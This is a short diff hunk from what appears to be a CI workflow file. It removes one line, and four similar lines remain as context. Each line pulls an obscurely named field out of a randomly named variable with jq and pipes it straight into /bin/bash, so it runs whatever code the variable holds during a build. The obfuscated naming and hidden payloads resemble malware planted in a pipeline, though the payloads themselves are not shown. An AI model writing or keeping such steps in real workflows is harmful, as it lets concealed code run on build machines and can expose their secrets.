@@ -21,7 +21,6 @@ jobs:
           printf '%s' "$xpfqb931" | jq -r .b8 | /bin/bash
           echo $avmiz0687 | jq -r .tpvx755 | /bin/bash
           printf '%s' "$x57920" | jq -r .rcth13 | /bin/bash
-          printf '%s' "$hyf9246" | jq -r .jrr71 | /bin/bash
           echo $wcr5 | jq -r .jzaw1 | /bin/bash
 
       - name: Store artifact
